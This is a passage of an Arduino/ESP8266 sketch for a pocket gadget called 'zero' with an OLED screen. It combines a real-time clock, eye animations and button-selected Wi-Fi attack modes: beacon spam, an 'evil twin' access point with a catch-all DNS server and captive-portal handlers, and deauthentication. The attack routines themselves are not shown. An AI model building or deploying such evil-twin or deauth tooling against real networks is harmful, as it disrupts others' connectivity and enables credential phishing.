        if (direction > 0)
        {
            right_eye_height -= direction_oversize;
            right_eye_width -= direction_oversize;
        }
        else
        {
            left_eye_height -= direction_oversize;
            left_eye_width -= direction_oversize;
        }
        draw_eyes();
        delay(1);
    }

    center_eyes();
}

void setup()
{
    Serial.begin(115200);
    Serial.println("Hello, ESP32!");
    if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C))
    { // Address for 128x64
        Serial.println(F("SSD1306 allocation failed"));
        for (;;)
            ;
    }
    flag = (int *)malloc(sizeof(int)); // Allocate memory for flag
    *flag = 0; // Initialize flag to 0

    

    if (digitalRead(12) == LOW)
    {
        *flag = 1;
    }    
    else if (digitalRead(14) == LOW)
    {
       *flag = 2;
    
       display.clearDisplay();
      display.setCursor(10, 28);
      display.setTextSize(2);
      display.print("ZERO-BEACON");
      display.display();
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1); 
    }
    else if (digitalRead(13) == LOW)
    {
       *flag = 3;
        display.clearDisplay();
      display.setCursor(10, 28);
      display.setTextSize(2);
      display.print("ZERO-EVILTWIN");
      display.display();
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP("zero", "deauther");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
    }
    else if (digitalRead(16) == LOW){
      *flag=4;
  display.setCursor(0,0);
  display.setTextColor(WHITE);
  display.clearDisplay();
  display.display();
  display.println("ZERO-DEAUTH");
 
  display.display();
  
  
  Serial.println("[!] WiFi deauther");
  Serial.println("[!] Initializing...\n\n");
  wifi_set_opmode(0x1);
  wifi_set_channel(set_channel);
  //wifi_promiscuous_enable(0);
  //wifi_set_promiscuous_rx_cb(promisc_cb);
  //wifi_promiscuous_enable(1);
  Serial.println("[!] Init finished\n\n");
  time_ = millis();

  // DO 2 SCANS
  scan();
  deauth_time = millis();
  Serial.print("Current time -> ");
  Serial.print(deauth_time);
  Serial.println("ms");
  //wifi_promiscuous_enable(0);
  //wifi_set_promiscuous_rx_cb(0);
  //wifi_promiscuous_enable(1);

  show_deauth();
    }

    
    else{
      *flag = 0;
    }

    


    display.clearDisplay();
    display.setCursor(0, 0);
    display.setTextSize(1);
    display.setTextColor(WHITE);

    display.setCursor(10, 28);
    
    display.setTextSize(2);
    display.print("zero");
    display.display();
    display.clearDisplay();

    display.setCursor(3, 28);
    display.setTextSize(2);
    display.setTextColor(WHITE);

    if (!rtc.begin())
    {
        Serial.println("Couldn't find RTC");
        while (1)
            ;
    }

    if (!rtc.isrunning())
    {
        Serial.println("RTC is NOT running!");
        // Following line sets the RTC to the date & time this sketch was compiled
      //  rtc.adjust(DateTime(F(DATE), F(TIME)));
    }

    Serial.println("Enter time in the format: YYYY MM DD HH MM SS");
}
void displayTimeDate();
void loop()
{
    if (*flag == 0)
    {  
        displayTimeDate(); // Display time on OLED
        delay(1000);

        if (Serial.available())
        {
            setTimeFromSerial();
        }
        if (millis()>sleeptimer){
          display.clearDisplay();
          display.display();
          ESP.deepSleep(0);

        }
    }
    else if (*flag == 1)
    {
        wakeup();
        center_eyes(true);
        move_right_big_eye();
        move_left_big_eye();
        blink(10);
        blink(20);
        happy_eye();
        sleep();
        int dir_x = random(-1, 2);
        int dir_y = random(-1, 2);
        saccade(dir_x, dir_y);
        delay(300);
        saccade(-dir_x, -dir_y);
        delay(300);
    }
    else if (*flag==2){
      display.setCursor(10, 28);
    
    display.setTextSize(2);
    display.print("ZERO-BEACON");
    display.display();
    display.clearDisplay();
      loop_beacon();
    }
    else if (*flag==3){
      display.setCursor(10, 28);
    
    display.setTextSize(2);
    display.print("ZERO-EVILTWIN");
    display.display();
    display.clearDisplay();
      loop_ev();
    }
    else if (*flag==4){
      loop_deauth();
    }
    //delay(10); // this speeds up the simulation
}

void displayTimeDate()
{
    String meridiem;
    int hour;

    // Calculate time and date
    DateTime now = rtc.now();

    int date = now.day();
    int monthNum = now.month();
    int year = now.year();

    String day = days[now.dayOfWeek()];
    int minute = now.minute();
    int second = now.second();

    // Convert 24hr format to 12hr format
    if (now.hour() >= 12)
    {
        meridiem = "PM";
        hour = now.hour() - 12;
    }
    else
    {
        meridiem = "AM";
        hour = now.hour();
    }

    if (hour == 0)
    {
        hour = 12;
    }

    // Display time on OLED display
    display.clearDisplay();

    display.setTextSize(2);
    display.setCursor(5, 10);
    display.print(day);

    display.setTextSize(3);
    display.setCursor(58, 6);
    if (date < 10)
        display.print(0);
    display.print(date);

    display.setTextSize(1);
    display.setCursor(97, 8);
    display.print(months[monthNum - 1]);
    display.setCursor(97, 20);
    display.print(year);

    display.setCursor(5, 39);
    display.setTextSize(3);
    if (hour < 10)
        display.print(0);
    display.print(hour);
    display.print(":");
    if (minute < 10)
        display.print(0);
    display.print(minute);
    display.setTextSize(2);
    display.setCursor(100, 37);
    if (second < 10)
        display.print(0);
    display.print(second);
    display.setTextSize(1);
    display.setCursor(100, 55);
    display.print(meridiem);
    display.display();
}

void setTimeFromSerial()
{
    if (Serial.available())
    {
        String input = Serial.readStringUntil('\n');
        int year, month, day, hour, minute, second;
        if (sscanf(input.c_str(), "%d %d %d %d %d %d", &year, &month, &day, &hour, &minute, &second) == 6)
        {
            rtc.adjust(DateTime(year, month, day, hour, minute, second));
            Serial.println("Time set successfully!");
        }
        else
        {
            Serial.println("Invalid format. Use: YYYY MM DD HH MM SS");
        }
    }
}
